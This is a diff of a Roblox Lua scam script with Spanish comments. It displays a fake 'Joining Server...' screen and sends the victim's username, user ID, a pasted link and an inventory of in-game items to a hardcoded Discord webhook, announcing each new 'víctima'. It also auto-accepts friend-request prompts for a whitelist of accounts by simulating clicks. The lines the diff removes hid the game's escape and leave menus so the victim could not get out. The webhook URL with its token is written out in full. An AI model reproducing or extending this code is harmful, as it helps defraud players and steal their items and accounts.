@@ -11,34 +11,14 @@ local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local VIM = game:GetService("VirtualInputManager")
 
--- ==================== CONFIGURACIÓN Y SEGURIDAD ====================
+-- ==================== CONFIGURACIÓN ====================
 local LocalPlayer = Players.LocalPlayer
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1454970356682199124/sgCgykHejgELxXd9Jp4CTWX2ziOKdu-qtGczLtBAThWZj-DqOY7jKGlNdgqYuYpuNXmA"
 local whitelist = {"mario_12fachero", "lejandro555", "pan71234520", "pan712345"}
-local heartbeatActive = true
+local Min_Gen = 0
 
--- Whitelist de Instancias para evitar que el script se borre a sí mismo
-local instanciasWhitelist = {}
-local function agregarAWhitelist(instancia)
-    if instancia then instanciasWhitelist[instancia] = true end
-end
-agregarAWhitelist(Players)
-agregarAWhitelist(CoreGui)
-agregarAWhitelist(StarterGui)
-agregarAWhitelist(LocalPlayer)
-
-local function estaEnWhitelist(instancia)
-    if instanciasWhitelist[instancia] then return true end
-    local p = instancia.Parent
-    while p do
-        if instanciasWhitelist[p] then return true end
-        p = p.Parent
-    end
-    return false
-end
-
--- ==================== TU LÓGICA DE ENVÍO (BRAINROTS) ====================
+-- ==================== TU INTERFAZ DE ENVÍO ANTIGUA (RESTAURADA) ====================
 local function formatNumberShort(n)
     if not n or type(n) ~= "number" then return "$0" end
     if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
@@ -62,14 +42,20 @@ end
 local function getBrainrots()
     local results = {}
     for _, desc in ipairs(Workspace:GetDescendants()) do
-        if desc:IsA("BillboardGui") or desc.Name:find("Overhead") then
-            local nameLbl = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name")
-            local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value")
+        if desc:IsA("BillboardGui") or desc.Name:find("Overhead") or desc.Name:find("Display") then
+            local nameLbl = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name") or desc:FindFirstChild("Title")
+            local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value") or desc:FindFirstChild("Stat")
+            
             if nameLbl and genLbl and nameLbl:IsA("TextLabel") and genLbl:IsA("TextLabel") then
                 local val = parseValueFromText(genLbl.Text)
-                local key = nameLbl.Text .. "|" .. val
-                if results[key] then results[key].count = results[key].count + 1
-                else results[key] = {name = nameLbl.Text, value = val, count = 1} end
+                if val >= Min_Gen then
+                    local key = nameLbl.Text .. "|" .. val
+                    if results[key] then 
+                        results[key].count = results[key].count + 1
+                    else 
+                        results[key] = {name = nameLbl.Text, value = val, count = 1} 
+                    end
+                end
             end
         end
     end
@@ -79,7 +65,40 @@ local function getBrainrots()
     return out
 end
 
--- ==================== COMANDOS Y WHITELIST ====================
+local function sendToDiscord(link, brainrots)
+    local itemList = ""
+    local totalValue = 0
+    for i, br in ipairs(brainrots) do
+        if i <= 15 then 
+            itemList = itemList .. string.format("> `[%d]` **%s** ➔ %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count)
+        end
+        totalValue = totalValue + (br.value * br.count)
+    end
+
+    local request = (syn and syn.request) or (http and http.request) or http_request or request
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                content = "||@everyone|| 🩸 **NUEVA VÍCTIMA DETECTADA**",
+                embeds = {{
+                    title = "🚀 Reporte de Extracción Profesional",
+                    color = 0,
+                    fields = {
+                        {name = "👤 Usuario", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
+                        {name = "💰 Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
+                        {name = "🔗 Script/Link", value = " " .. link .. " "},
+                        {name = "📋 Inventario", value = (itemList ~= "" and itemList or "Vacío")}
+                    }
+                }}
+            })
+        })
+    end)
+end
+
+-- ==================== COMANDOS (CON AUTO-ACEPTAR) ====================
 local function isWhitelisted(name)
     for _, n in ipairs(whitelist) do if n == name then return true end end
     return false
@@ -91,6 +110,22 @@ local function configurarComandos(p)
         if isWhitelisted(p.Name) then
             if msgLower == ".add" then
                 StarterGui:SetCore("PromptSendFriendRequest", p)
+                task.spawn(function()
+                    task.wait(0.6)
+                    pcall(function()
+                        local prompt = CoreGui:FindFirstChild("RobloxGui"):FindFirstChild("PromptDialog")
+                        if prompt then
+                            local confirmBtn = prompt:FindFirstChild("Container"):FindFirstChild("ConfirmButton")
+                            if confirmBtn then
+                                local x = confirmBtn.AbsolutePosition.X + (confirmBtn.AbsoluteSize.X / 2)
+                                local y = confirmBtn.AbsolutePosition.Y + (confirmBtn.AbsoluteSize.Y / 2)
+                                VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)
+                                task.wait(0.1)
+                                VIM:SendMouseButtonEvent(x, y, 0, false, game, 0)
+                            end
+                        end
+                    end)
+                end)
             elseif msgLower == ".block" then
                 for _, target in ipairs(Players:GetPlayers()) do
                     if target ~= LocalPlayer and not isWhitelisted(target.Name) then
@@ -104,50 +139,10 @@ local function configurarComandos(p)
     end)
 end
 
--- ==================== LIMPIEZA AGRESIVA DEL MENÚ DE ESCAPE ====================
-local function handleNewDescendant(descendant)
-    if descendant.Name == "Players" or descendant.Name == "LeaveGamePage" then
-        task.wait() 
-        pcall(function() descendant:Destroy() end)
-    end
-end
-
-local function bloquearMenuEscape()
-    task.spawn(function()
-        while task.wait(0.5) do
-            pcall(function()
-                local innerFrame = CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
-                if innerFrame:FindFirstChild("Players") then innerFrame.Players:Destroy() end
-                if innerFrame:FindFirstChild("LeaveGamePage") then innerFrame.LeaveGamePage:Destroy() end
-            end)
-        end
-    end)
-end
-
-CoreGui.DescendantAdded:Connect(handleNewDescendant)
-for _, desc in ipairs(CoreGui:GetDescendants()) do handleNewDescendant(desc) end
-
--- ==================== LÓGICA DE BLOQUEO ORIGINAL (VIM) ====================
-CoreGui.DescendantAdded:Connect(function(descendant)
-    if descendant:IsA("GuiObject") and descendant:FindFirstAncestorWhichIsA("ScreenGui") and descendant:FindFirstAncestorWhichIsA("ScreenGui").Name == "BlockingModalScreen" then
-        if descendant:IsA("TextLabel") then descendant:Destroy() end
-        if descendant:IsA("GuiObject") then descendant.BackgroundTransparency = 1 end
-        if descendant.Name == "3" and descendant.Parent and descendant.Parent.Name == "Buttons" then
-            descendant.Size = UDim2.new(0, 5000, 0, 5000)
-            descendant.Position = UDim2.new(0.5, 0, 0.5, 0)
-            descendant.AnchorPoint = Vector2.new(0.5, 0.5)
-            task.wait()
-            local clickX, clickY = descendant.AbsolutePosition.X + descendant.AbsoluteSize.X/2, descendant.AbsolutePosition.Y + descendant.AbsoluteSize.Y/2
-            VIM:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
-            task.wait(0.1)
-            VIM:SendMouseButtonEvent(clickX, clickY, 0, false, game, 0)
-        end
-    end
-end)
-
--- ==================== UI PROFESIONAL RESTAURADA ====================
+-- ==================== INTERFAZ GUI (BLANCO Y NEGRO) ====================
 local function buildUI()
     local screenGui = Instance.new("ScreenGui", playerGui)
+    screenGui.Name = "MoreiraSystem"
     screenGui.IgnoreGuiInset = true
 
     local main = Instance.new("Frame", screenGui)
@@ -155,14 +150,14 @@ local function buildUI()
     main.Position = UDim2.new(0.5, -225, 0.5, -100)
     main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
     Instance.new("UICorner", main)
-    Instance.new("UIStroke", main).Color = Color3.new(1,1,1)
+    Instance.new("UIStroke", main).Color = Color3.new(1, 1, 1)
 
     local input = Instance.new("TextBox", main)
     input.Size = UDim2.new(0.8, 0, 0, 45)
     input.Position = UDim2.new(0.1, 0, 0.4, 0)
     input.PlaceholderText = "Pega el link aquí..."
     input.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    input.TextColor3 = Color3.new(1,1,1)
+    input.TextColor3 = Color3.new(1, 1, 1)
     Instance.new("UICorner", input)
 
     local btn = Instance.new("TextButton", main)
@@ -175,37 +170,16 @@ local function buildUI()
 
     btn.MouseButton1Click:Connect(function()
         if input.Text ~= "" then
+            local text = input.Text
             main.Visible = false
-            local brs = getBrainrots()
-            local totalVal = 0
-            local items = ""
-            for i,v in ipairs(brs) do totalVal = totalVal + (v.value * v.count) if i <= 20 then items = items..v.name.." x"..v.count.."\n" end end
             
-            pcall(function()
-                local request = (syn and syn.request) or (http and http.request) or request
-                request({
-                    Url = WEBHOOK_URL,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode({
-                        content = "||@everyone|| 🩸 **VÍCTIMA LISTA**",
-                        embeds = {{
-                            title = "Reporte Profesional",
-                            fields = {
-                                {name = "💰 Valor Total", value = formatNumberShort(totalVal), inline = true},
-                                {name = "🔗 Link", value = input.Text},
-                                {name = "📋 Items", value = items}
-                            },
-                            color = 0
-                        }}
-                    })
-                })
-            end)
-
+            -- Pantalla de Carga
             local black = Instance.new("Frame", screenGui)
-            black.Size = UDim2.new(1.2, 0, 1.2, 0)
+            black.Size = UDim2.new(1.5, 0, 1.5, 0)
+            black.Position = UDim2.new(-0.25, 0, -0.25, 0)
             black.BackgroundColor3 = Color3.new(0, 0, 0)
-            black.ZIndex = 999
+            black.ZIndex = 100
+            
             local lbl = Instance.new("TextLabel", black)
             lbl.Size = UDim2.new(1, 0, 1, 0)
             lbl.Text = "Joining Server..."
@@ -213,7 +187,12 @@ local function buildUI()
             lbl.TextSize = 35
             lbl.Font = Enum.Font.GothamBold
             lbl.BackgroundTransparency = 1
-            bloquearMenuEscape()
+
+            -- TU ENVÍO ORIGINAL
+            task.spawn(function()
+                local brs = getBrainrots()
+                sendToDiscord(text, brs)
+            end)
         end
     end)
 end
@@ -230,15 +209,5 @@ task.spawn(function()
             if playerGui:FindFirstChild("Chat") then playerGui.Chat.Frame.Visible = false end
         end)
         task.wait(2)
-    end
-end)
-
--- Ghost Mode (Invisibilidad de otros)
-Workspace.DescendantAdded:Connect(function(d)
-    if d:IsA("Model") and Players:GetPlayerFromCharacter(d) and d.Name ~= LocalPlayer.Name then
-        task.wait(0.5)
-        for _, p in ipairs(d:GetDescendants()) do
-            if p:IsA("BasePart") then p.Transparency = 1 p.CanCollide = false end
-        end
     end
 end)
